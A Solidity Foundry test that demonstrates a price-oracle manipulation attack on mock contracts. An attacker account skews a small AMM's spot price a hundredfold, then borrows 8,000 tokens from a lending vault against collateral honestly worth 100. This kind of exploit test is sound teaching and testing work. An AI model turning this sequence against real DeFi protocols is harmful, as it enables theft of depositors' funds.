// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/MockERC20.sol";
import "../src/MiniAMM.sol";
import "../src/NaiveSpotOracle.sol";
import "../src/LendingVault.sol";

contract OracleAttackTest is Test {
    MockERC20 coll;
    MockERC20 quote;
    MiniAMM amm;
    NaiveSpotOracle oracle;
    LendingVault vault;
    address attacker = address(0xA11CE);

    function setUp() public {
        coll = new MockERC20();
        quote = new MockERC20();
        amm = new MiniAMM(coll, quote);
        oracle = new NaiveSpotOracle(amm);
        vault = new LendingVault(coll, quote, oracle);

        coll.mint(address(amm), 1000e18);
        quote.mint(address(amm), 1000e18); // honest price: 1 COLL = 1 QUOTE
        quote.mint(address(vault), 10_000e18); // vault has QUOTE to lend
        quote.mint(attacker, 9_000e18); // "flash loan" capital (real world: borrowed & repaid same tx)
    }

    function test_NaiveOracleAllowsMassiveOverBorrow() public {
        vm.startPrank(attacker);
        assertEq(oracle.priceOfColl(), 1e18); // honest

        quote.approve(address(amm), type(uint256).max);
        amm.swapQuoteForColl(9_000e18); // manipulate
        assertEq(oracle.priceOfColl(), 100e18); // COLL now "worth" 100x

        coll.approve(address(vault), type(uint256).max);
        vault.deposit(100e18); // honestly worth 100 QUOTE

        uint256 before = quote.balanceOf(attacker);
        vault.borrow(8_000e18); // honest cap was 80 QUOTE
        assertEq(quote.balanceOf(attacker) - before, 8_000e18);
        vm.stopPrank();
    }
}
